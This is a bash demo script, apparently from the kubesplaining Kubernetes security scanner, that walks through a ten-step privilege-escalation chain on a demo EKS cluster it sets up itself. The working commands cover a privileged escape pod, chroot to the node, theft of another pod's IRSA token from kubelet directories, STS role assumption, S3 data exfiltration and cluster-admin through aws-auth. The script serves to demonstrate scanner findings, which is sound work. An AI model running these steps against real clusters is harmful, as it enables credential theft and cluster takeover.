#!/usr/bin/env bash
#
# Interactive PoC walkthrough for the kubesplaining EKS live demo (`make eks-demo-poc`).
#
# Plays the role of an attacker who compromised the dev-team:dev-deployer-sa
# Kubernetes identity, creates a privileged pod to escape to the host, harvests
# a co-resident prod-data-pipeline-sa IRSA token from /var/lib/kubelet, assumes
# the high-privilege AWS role via STS, exfils an S3 object, and finally loops
# back into Kubernetes as system:masters via aws-auth.
#
# Modes:
#   default        Dry-run. Prints each step's narration and command. Nothing executes.
#   --execute      Interactive. Same output, but pauses for ENTER before each command.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=common.sh
source "${SCRIPT_DIR}/common.sh"

EXECUTE=0
for arg in "$@"; do
  case "${arg}" in
    --execute) EXECUTE=1 ;;
    --help|-h)
      cat <<EOF
usage: scripts/eks-demo/poc.sh [--execute]

Walks through the holy-splain attack chain end to end.

Default (no flag):  dry-run. Prints all 10 steps so you can read the entire
                    attack before deciding to run anything.
--execute:          interactive. After each step's command block, pauses for
                    ENTER so you can run it (or ctrl-c to abort the demo).

Prerequisites:
  - \`make eks-demo-up\` has succeeded and .tmp/eks-demo-state.json is present
  - \`make eks-demo-scan\` has been run at least once (step 10 references findings.json)
EOF
      exit 0
      ;;
    *)
      err "unknown argument: ${arg}"
      exit 2
      ;;
  esac
done

# Pre-flight: load state if available. In --execute mode the script needs real
# values; in dry-run mode placeholders are fine so a curious operator can read
# the whole attack before deciding to spin up real AWS resources.
require_cmd kubectl
if [[ "${EXECUTE}" == "1" ]]; then
  require_cmd aws
  require_cmd eksctl
fi

if state_load; then
  BUCKET="${STATE_BUCKET}"
  ROLE_ARN="$(role_arn)"
  CURRENT_CLUSTER_CONTEXT="$(kubectl config current-context 2>/dev/null || true)"
  CLUSTER_REF="$(kubectl config view -o jsonpath="{.contexts[?(@.name=='${CURRENT_CLUSTER_CONTEXT}')].context.cluster}" 2>/dev/null || true)"
  if [[ "${EXECUTE}" == "1" ]] && [[ -z "${CURRENT_CLUSTER_CONTEXT}" || -z "${CLUSTER_REF}" ]]; then
    err "no current kubectl context for cluster ${CLUSTER_NAME}."
    err "  Run: aws eks update-kubeconfig --name ${CLUSTER_NAME} --region ${AWS_REGION}"
    exit 1
  fi
  # Fall back to placeholders if a field came back empty (shouldn't happen after
  # a successful setup.sh, but keeps the dry-run printable).
  CLUSTER_REF="${CLUSTER_REF:-<cluster-kubeconfig-name>}"
elif [[ "${EXECUTE}" == "1" ]]; then
  err "no demo state at ${STATE_FILE}. Run \`make eks-demo-up\` first."
  exit 1
else
  warn "no demo state found; printing dry-run with placeholders"
  BUCKET="<demo-bucket-name>"
  ROLE_ARN="arn:aws:iam::<ACCOUNT_ID>:role/${ROLE_NAME}"
  CLUSTER_REF="<cluster-kubeconfig-name>"
fi

# Print mode banner.
if [[ "${EXECUTE}" == "1" ]]; then
  printf '\n%s▶ PoC mode: EXECUTE%s — each command will run after ENTER.\n' "${C_BOLD}${C_YELLOW}" "${C_RESET}"
  printf '%sCtrl-C at any prompt to abort.%s\n' "${C_DIM}" "${C_RESET}"
else
  printf '\n%s▶ PoC mode: DRY-RUN%s — commands are printed but NOT executed.\n' "${C_BOLD}${C_BLUE}" "${C_RESET}"
  printf '%sRun with --execute to actually attack the demo cluster.%s\n' "${C_DIM}" "${C_RESET}"
fi

# step_run <title> <annotation> <command...>
# The cyan title + dim annotation + tinted command is the same shape on every step.
# In --execute mode, pauses for ENTER and then runs the command via `eval`.
step_run() {
  local title="$1" annotation="$2" cmd="$3"
  printf '\n%s▶ %s%s\n' "${C_BOLD}${C_CYAN}" "${title}" "${C_RESET}"
  printf '%s  %s%s\n' "${C_DIM}" "${annotation}" "${C_RESET}"
  printf '\n%s    %s%s\n' "${C_BLUE}" "${cmd}" "${C_RESET}"
  if [[ "${EXECUTE}" == "1" ]]; then
    printf '\n    %s[ENTER to execute, ctrl-c to abort]%s ' "${C_DIM}" "${C_RESET}"
    read -r _
    # Disable set -e for the duration of the eval so a single non-zero exit
    # (e.g. `kubectl auth can-i` returning "no") doesn't kill the walkthrough.
    # The PoC is a teaching script: each step prints its result and we continue.
    # set -e is restored afterward.
    set +e
    # Run in a subshell so a step's `cd` or env exports don't leak. EXCEPT for
    # steps 6 (sets STOLEN), 7 (exports AWS_*), and 9 (uses STOLEN + AWS_*) —
    # those must execute in the top-level shell so the variables persist
    # across step boundaries.
    if [[ "${title}" == "Step 6"* ]] || [[ "${title}" == "Step 7"* ]] || [[ "${title}" == "Step 9"* ]]; then
      eval "${cmd}"
      step_rc=$?
    else
      (eval "${cmd}")
      step_rc=$?
    fi
    set -e
    if [[ "${step_rc}" -ne 0 ]]; then
      printf '    %s(step exited with code %s; continuing)%s\n' "${C_DIM}" "${step_rc}" "${C_RESET}"
    fi
  fi
}

# === Step 1 ===================================================================
step_run "Step 1: become the attacker (compromised dev-deployer-sa)" \
"Mints a 1-hour SA token for dev-team:dev-deployer-sa and adds a kubeconfig context
  named ${CONTEXT_ATTACKER} pointing at the same cluster but using that token.
  Models a CI identity whose token leaked. The operator can switch contexts at any
  time via 'kubectl config use-context ${CONTEXT_ATTACKER}'." \
"TOKEN=\$(kubectl create token ${SA_DEV} -n ${NAMESPACE_DEV} --duration=1h) && \\
  kubectl config set-credentials holy-splain-dev-deployer-sa --token=\"\$TOKEN\" >/dev/null && \\
  kubectl config set-context ${CONTEXT_ATTACKER} --cluster=${CLUSTER_REF} --user=holy-splain-dev-deployer-sa --namespace=${NAMESPACE_DEV} >/dev/null && \\
  echo 'attacker context: ${CONTEXT_ATTACKER}'"

# === Step 2 ===================================================================
step_run "Step 2: confirm the attacker is namespace-isolated" \
"Verifies that ${SA_DEV} cannot access prod-data via Kubernetes RBAC.
  This is what makes the attack 'indirect' — we will bypass the namespace
  boundary entirely by escaping below the Kubernetes layer." \
"kubectl --context=${CONTEXT_ATTACKER} auth can-i get pods -n ${NAMESPACE_PROD} ; \\
  kubectl --context=${CONTEXT_ATTACKER} auth can-i list secrets -A ; \\
  kubectl --context=${CONTEXT_ATTACKER} auth can-i create pods -n ${NAMESPACE_DEV}"

# === Step 3 ===================================================================
step_run "Step 3: apply the privileged escape pod (kubesplaining warned: KUBE-PRIVESC-002)" \
"Creates a pod in dev-team with hostPID, hostNetwork, privileged, and / mounted at /host.
  ${NAMESPACE_DEV} does not enforce restricted Pod Security Admission, which is
  exactly the precondition kubesplaining flagged in the scan (KUBE-PRIVESC-PATH-NODE-ESCAPE)." \
"kubectl --context=${CONTEXT_ATTACKER} apply -f ${ROOT_DIR}/scripts/eks-demo/privileged-attacker-pod.yaml && \\
  kubectl --context=${CONTEXT_ATTACKER} wait --for=condition=Ready pod/attacker -n ${NAMESPACE_DEV} --timeout=120s"

# === Step 4 ===================================================================
step_run "Step 4: demonstrate node-host access" \
"chroot /host puts us at the node's filesystem root. Showing /etc/kubernetes
  and the kubelet pod directory is enough to prove the attacker is now effectively
  root on the EC2 instance, side-stepping every Kubernetes-layer control." \
"kubectl --context=${CONTEXT_ATTACKER} exec attacker -n ${NAMESPACE_DEV} -- chroot /host /bin/sh -c '
  echo \"-- node hostname --\";
  cat /etc/hostname;
  echo \"-- /etc/kubernetes (kubelet config + bootstrap) --\";
  ls /etc/kubernetes 2>/dev/null | head;
  echo \"-- pods scheduled here --\";
  ls /var/lib/kubelet/pods 2>/dev/null | head'"

# === Step 5 ===================================================================
step_run "Step 5: harvest a co-resident prod-data-pipeline-sa token (kubesplaining warned: KUBE-CLOUD-IRSA-ADMIN-ROLE-001)" \
"Walks /var/lib/kubelet/pods/.../volumes/kubernetes.io~projected/<vol>/token, base64-decodes
  the JWT payload, and prints the path of the first token whose subject claim names
  ${NAMESPACE_PROD}:${SA_PROD}. The DaemonSet in setup guarantees this token is
  present on every node. NOTE: kubesplaining does NOT model 'node-escape implies
  any-pod-token-theft' in its privesc graph — this is the cross-chain gap a human
  attacker bridges. Comprehensive coverage of BOTH chains is what flags the risk." \
"kubectl --context=${CONTEXT_ATTACKER} exec attacker -n ${NAMESPACE_DEV} -- chroot /host /bin/sh -c '
  for t in \$(find /var/lib/kubelet/pods -name token 2>/dev/null); do
    payload=\$(awk -F. \"{print \\\$2}\" \"\$t\" 2>/dev/null | base64 -d 2>/dev/null || true);
    case \"\$payload\" in
      *prod-data-pipeline-sa*)
        echo \"FOUND_PROD_TOKEN_PATH=\$t\";
        echo \"-- first 80 chars of JWT --\";
        head -c 80 \"\$t\"; echo;
        echo \"-- subject claim (extracted from JWT payload) --\";
        echo \"\$payload\" | grep -o \"sub[^,}]*\" | head -1;
        exit 0;;
    esac;
  done;
  echo \"no prod-data-pipeline-sa token on this node\" >&2;
  exit 1'"

# === Step 6 ===================================================================
step_run "Step 6: stash the stolen JWT for the assume-role call" \
"Captures the raw token into the STOLEN shell variable. Nothing is written to disk;
  the token lives only in memory for the rest of the PoC session." \
"STOLEN=\$(kubectl --context=${CONTEXT_ATTACKER} exec attacker -n ${NAMESPACE_DEV} -- chroot /host /bin/sh -c '
  for t in \$(find /var/lib/kubelet/pods -name token 2>/dev/null); do
    payload=\$(awk -F. \"{print \\\$2}\" \"\$t\" 2>/dev/null | base64 -d 2>/dev/null || true);
    case \"\$payload\" in *prod-data-pipeline-sa*) cat \"\$t\"; exit 0;; esac;
  done; exit 1') && \\
  echo \"stolen token (first 40 chars): \${STOLEN:0:40}...\""

# === Step 7 ===================================================================
step_run "Step 7: AssumeRoleWithWebIdentity using the stolen token (kubesplaining warned: KUBE-CLOUD-IRSA-ADMIN-ROLE-001)" \
"Trades the harvested K8s JWT for short-lived AWS credentials by calling STS.
  AWS validates the token against the role's OIDC trust policy: federated provider
  matches the cluster issuer, subject claim equals ${NAMESPACE_PROD}:${SA_PROD}.
  Exports AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN into this shell." \
"CREDS_JSON=\$(aws sts assume-role-with-web-identity \\
    --role-arn ${ROLE_ARN} \\
    --role-session-name holy-splain-node-escape \\
    --web-identity-token \"\$STOLEN\" \\
    --duration-seconds 900) && \\
  export AWS_ACCESS_KEY_ID=\$(echo \"\$CREDS_JSON\" | sed -nE 's/.*\"AccessKeyId\": *\"([^\"]+)\".*/\\1/p') && \\
  export AWS_SECRET_ACCESS_KEY=\$(echo \"\$CREDS_JSON\" | sed -nE 's/.*\"SecretAccessKey\": *\"([^\"]+)\".*/\\1/p') && \\
  export AWS_SESSION_TOKEN=\$(echo \"\$CREDS_JSON\" | sed -nE 's/.*\"SessionToken\": *\"([^\"]+)\".*/\\1/p') && \\
  aws sts get-caller-identity"

# === Step 8 ===================================================================
step_run "Step 8: exfiltrate the flag from S3" \
"With the assumed-role credentials still in the shell, read the demo flag.
  This is the data-loss arm of the chain: visible even without the aws-auth loopback." \
"aws s3 cp s3://${BUCKET}/flag.txt -"

# === Step 9 ===================================================================
step_run "Step 9: loop back to K8s as system:masters via aws-auth (kubesplaining warned: KUBE-CLOUD-AWSAUTH-SYSTEM-MASTERS-001)" \
"Mints a K8s API token using the assumed-role AWS creds (already exported in this
  shell). aws-auth maps ${ROLE_NAME} to system:masters, so the K8s API server
  resolves the caller to cluster-admin. We do NOT pass --role-arn to get-token:
  we already ARE the role, no second AssumeRole call needed." \
"K8S_TOKEN=\$(aws eks get-token --cluster-name ${CLUSTER_NAME} --region ${AWS_REGION} --output text --query 'status.token') && \\
  kubectl config set-credentials ${CONTEXT_ADMIN_LOOPBACK} --token=\"\$K8S_TOKEN\" >/dev/null && \\
  kubectl config set-context ${CONTEXT_ADMIN_LOOPBACK} --cluster=${CLUSTER_REF} --user=${CONTEXT_ADMIN_LOOPBACK} >/dev/null && \\
  echo '-- can we do anything as system:masters? --' && \\
  kubectl --context=${CONTEXT_ADMIN_LOOPBACK} auth can-i '*' '*' --all-namespaces && \\
  echo '-- proof: list pods cluster-wide (formerly forbidden in step 2) --' && \\
  kubectl --context=${CONTEXT_ADMIN_LOOPBACK} get pods -A | head -8"

# === Step 10 ==================================================================
step_run "Step 10: stitching reveal" \
"Prints the two privesc paths kubesplaining emitted at scan time, side by side.
  Chain A ends at sink:node_escape. Chain B starts at prod-data-pipeline-sa and
  ends at sink:system_masters via the AWS IAM external node. The graph does NOT
  connect them; comprehensive coverage of both halves is what let you connect
  them as a human attacker." \
"REPORT=${ROOT_DIR}/.tmp/eks-demo-report/findings.json && \\
  if [ -f \"\$REPORT\" ] && command -v jq >/dev/null 2>&1; then \\
    echo '--- Chain A: KUBE-PRIVESC-PATH-NODE-ESCAPE ---'; \\
    jq '.[] | select(.rule_id == \"KUBE-PRIVESC-PATH-NODE-ESCAPE\" and .subject.namespace == \"dev-team\") | {subject: .subject, hops: .escalation_path}' \"\$REPORT\"; \\
    echo; \\
    echo '--- Chain B: KUBE-PRIVESC-PATH-SYSTEM-MASTERS (via AWS IAM) ---'; \\
    jq '.[] | select(.rule_id == \"KUBE-PRIVESC-PATH-SYSTEM-MASTERS\" and .subject.namespace == \"prod-data\") | {subject: .subject, hops: .escalation_path}' \"\$REPORT\"; \\
  else \\
    echo \"findings.json missing or jq not on PATH. Run 'make eks-demo-scan' first; jq is pinned by Hermit, so activate it with '. ./bin/activate-hermit'.\"; \\
  fi"

# --- Closing banner ----------------------------------------------------------
RULE="═══════════════════════════════════════════════════════════════════════"
if [[ "${EXECUTE}" == "1" ]]; then
  printf "\n%s%s%s\n" "${C_BOLD}${C_GREEN}" "${RULE}" "${C_RESET}"
  printf "  %s✓ PoC complete. Attacker reached system:masters from namespaced ${SA_DEV}.${C_RESET}\n" "${C_BOLD}${C_GREEN}"
  printf "%s%s%s\n\n" "${C_BOLD}${C_GREEN}" "${RULE}" "${C_RESET}"
  printf "  %sClean up:%s ${C_BLUE}make eks-demo-down${C_RESET}\n\n" "${C_BOLD}" "${C_RESET}"
else
  printf "\n%s%s%s\n" "${C_BOLD}${C_BLUE}" "${RULE}" "${C_RESET}"
  printf "  %sDry-run complete. Re-run with --execute to actually carry out the attack.${C_RESET}\n" "${C_BOLD}"
  printf "%s%s%s\n\n" "${C_BOLD}${C_BLUE}" "${RULE}" "${C_RESET}"
fi
